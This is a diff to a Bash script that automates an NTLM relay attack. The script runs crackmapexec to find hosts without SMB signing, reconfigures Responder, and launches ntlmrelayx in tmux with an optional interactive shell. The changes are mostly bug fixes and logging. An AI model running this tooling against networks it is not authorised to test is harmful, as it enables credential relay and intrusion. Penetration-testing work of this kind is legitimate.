@@ -26,14 +26,14 @@ network_interface="auto"
 
 # Network interface (dynamically detected by default)
 detect_network_interface() {
-    network_interface="$(ip route 2>/dev/null | awk '/default/ {print $5; exit}')"
+    ip route 2>/dev/null | awk '/default/ {print $5; exit}'
 }
 
 # Print help
 print_help() {
     echo -e "${BLUE}Usage: $0 -f TARGET_FILE [-i NETWORK_INTERFACE] [-x] [-h]${RESET}"
     echo -e "  ${YELLOW}-f TARGET_FILE${RESET}         (Required) File containing target IPs to scan for misconfigured SMB signing."
-    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: ${network_interface})."
+    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: auto-detected)."
     echo -e "  ${YELLOW}-x${RESET}                     (Optional) Enable interactive shell in ntlmrelayx."
     echo -e "  ${YELLOW}-h${RESET}                     Display this help and exit."
 }
@@ -109,7 +109,7 @@ run_crackmapexec() {
     echo -e "${GREEN}[*] Generating list of vulnerable targets in ${output_file}.${RESET}"
     
     # Run crackmapexec and let it generate the relay list
-    crackmapexec smb "${target_file}" --gen-relay-list "${output_file}" || {
+    crackmapexec smb "${target_file}" --gen-relay-list "${output_file}" 2>&1 | tee -a attack.log || {
         echo -e "${RED}[!] crackmapexec failed. Exiting.${RESET}"
         exit 1
     }
@@ -133,8 +133,8 @@ edit_responder_conf() {
             echo -e "${BLUE}[*] Responder.conf already configured with SMB and HTTP set to 'Off'.${RESET}"
         else
             echo -e "${YELLOW}[*] Updating Responder.conf to turn off SMB and HTTP...${RESET}"
-            sed -i 's/^SMB = .*/SMB = Off/' "${RESPONDER_CONFIG_FILE}"
-            sed -i 's/^HTTP = .*/HTTP = Off/' "${RESPONDER_CONFIG_FILE}"
+            sed -i 's/^\s*SMB\s*=.*/SMB = Off/' "$RESPONDER_CONFIG_FILE"
+            sed -i 's/^\s*HTTP\s*=.*/HTTP = Off/' "$RESPONDER_CONFIG_FILE"
             echo -e "${GREEN}[+] Responder.conf updated successfully.${RESET}"
         fi
     else
@@ -150,8 +150,7 @@ start_tmux_window() {
     local command=$3
     
     # Create the window in the tmux session
-    tmux has-window -t "$session_name:$window_name" 2>/dev/null || \
-    tmux new-window -t "$session_name" -n "$window_name"
+    tmux new-window -t "$session_name" -n "$window_name" 2>/dev/null || true
     
     # Send the command to the new tmux window
     tmux send-keys -t "$session_name:$window_name" "$command" C-m
@@ -262,8 +261,13 @@ check_dependencies() {
 main() {
     parse_args "$@"
     
-    if [ -z "$network_interface" ] || [ "$network_interface" = "auto" ]; then
+    if [ "$network_interface" = "auto" ]; then
         network_interface="$(detect_network_interface)"
+    fi
+    
+    if [ -z "$network_interface" ]; then
+        echo -e "${RED}[!] Could not detect network interface.${RESET}"
+        exit 1
     fi
     
     validate
